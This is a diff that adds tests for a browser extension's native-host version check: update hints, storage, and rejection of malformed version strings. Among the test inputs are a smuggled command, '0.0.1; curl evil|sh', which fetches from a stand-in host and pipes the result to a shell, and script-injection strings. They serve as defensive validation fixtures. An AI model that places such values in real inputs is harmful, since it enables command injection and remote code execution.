@@ -191,3 +191,77 @@ test("a worker woken by the settings page reports the stored host, not none, bef
     const r = await bg_status(seen);
     assert.equal(r.data.hostSeen, true, "the installer guide must not draw for a person who has a host");
 });
+
+// --- the host-version hint: an update is offered only for a host KNOWN to be older than this build's pin ---
+
+const pinned = JSON.parse((await import("node:fs")).readFileSync(new URL("../tools/host-dist.json", import.meta.url), "utf8")).tag.replace(/^v/, "");
+const probe = async (bg) => (await bg.send({ type: "SHELL_STATUS", payload: { probe: true } }, { ...PAGE })).data;
+
+test("an older host is offered the update: its parsed version is kept and shown, the pin beside it", T, async () => {
+    const bg = loadBackground({ config: base, onNative: fakeNativeHost({ version: "0.0.1" }).onNative });
+    const r = await probe(bg);
+    assert.deepEqual([r.hostOutdated, r.hostVersion, r.pinnedHostVersion], [true, "0.0.1", pinned]);
+    assert.equal(bg.localStore.shellHostVersion, "0.0.1", "stored for the profile, parsed");
+});
+
+test("a host equal to the pin, or newer, gets no hint", T, async () => {
+    for (const version of [pinned, "999.0.0"]) {
+        const bg = loadBackground({ config: base, onNative: fakeNativeHost({ version }).onNative });
+        const r = await probe(bg);
+        assert.deepEqual([r.hostOutdated, r.hostVersion], [undefined, version], version);
+    }
+});
+
+test("a version that is not the pin's shape is unknown: no hint, nothing stored, and the raw text appears nowhere in the status", T, async () => {
+    for (const version of ["0.0.1-dev", "banana", "0.0", "0.0.1 <script>alert(1)</script>", "v0.0.1"]) {
+        const bg = loadBackground({ config: base, local: { shellHostVersion: "0.0.1" }, onNative: fakeNativeHost({ version }).onNative });
+        const r = await probe(bg);
+        assert.deepEqual([r.hostOutdated, r.hostVersion], [undefined, undefined], version);
+        assert.equal(bg.localStore.shellHostVersion, undefined, "an older stored version is cleared, not judged against");
+        assert.ok(!JSON.stringify(r).includes(JSON.stringify(version)), `the raw ${version} is not in the answer`);
+    }
+});
+
+test("upgrade: a profile with only the old shellHostSeen flag has no version, so no hint until the next hello", T, async () => {
+    const bg = loadBackground({ config: base, local: { shellHostSeen: true }, onNative: fakeNativeHost({ version: "0.0.1" }).onNative });
+    const before = (await status(bg, false)).data;
+    assert.deepEqual([before.hostSeen, before.hostVersion, before.hostOutdated], [true, undefined, undefined], "a host was seen, its version is not known");
+    assert.deepEqual(bg.nativeConnects, [], "knowing that did not start the host");
+    const after = await probe(bg);
+    assert.deepEqual([after.hostOutdated, after.hostVersion], [true, "0.0.1"], "the next hello fills it in");
+});
+
+test("a stored version that is not the shape is read as unknown, and a stored older one is offered without starting the host", T, async () => {
+    const junk = loadBackground({ config: base, local: { shellHostSeen: true, shellHostVersion: "0.0.1; curl evil|sh" } });
+    assert.equal((await status(junk, false)).data.hostOutdated, undefined);
+    const old = loadBackground({ config: base, local: { shellHostSeen: true, shellHostVersion: "0.0.1" } });
+    const r = (await status(old, false)).data;
+    assert.deepEqual([r.hostOutdated, r.hostVersion], [true, "0.0.1"]);
+    assert.deepEqual(old.nativeConnects, []);
+});
+
+test("after the update, Check again re-reads a host that was left running: the offer retires", T, async () => {
+    let version = "0.0.1";
+    const host = fakeNativeHost({ get version() { return version; } });
+    const bg = loadBackground({ config: { ...base, ...ON }, onNative: host.onNative });
+    await flush(30);
+    assert.equal((await status(bg, false)).data.hostOutdated, true, "connected to the old binary");
+    version = pinned;   // the installer replaced the binary
+    const r = await probe(bg);
+    assert.deepEqual([r.hostOutdated, r.hostVersion], [undefined, pinned], "a fresh hello, not the open port's old one");
+});
+
+test("connected with ml.sh on, a host version that does not parse is unknown in the answer (the status the inspector reads is the same object)", T, async () => {
+    for (const version of ["banana-7", "0.0.1-dev<script>", "v0.0.1"]) {
+        const bg = loadBackground({ config: { ...base, ...ON }, onNative: fakeNativeHost({ version }).onNative });
+        await flush(30);
+        const r = await status(bg);   // refresh: true goes through connect
+        assert.equal(r.data.ready, true);
+        assert.equal(r.data.host.version, "unknown", version);
+        assert.equal(r.data.hostVersion, undefined);
+        assert.ok(!JSON.stringify(r).includes(JSON.stringify(version).slice(1, -1)), `the raw ${version} is not in the SHELL_STATUS answer`);
+    }
+    const ok = loadBackground({ config: { ...base, ...ON }, onNative: fakeNativeHost({ version: "0.2.0" }).onNative });
+    await flush(30);
+    assert.equal((await status(ok)).data.host.version, "0.2.0", "a parseable version is shown as parsed");
+});
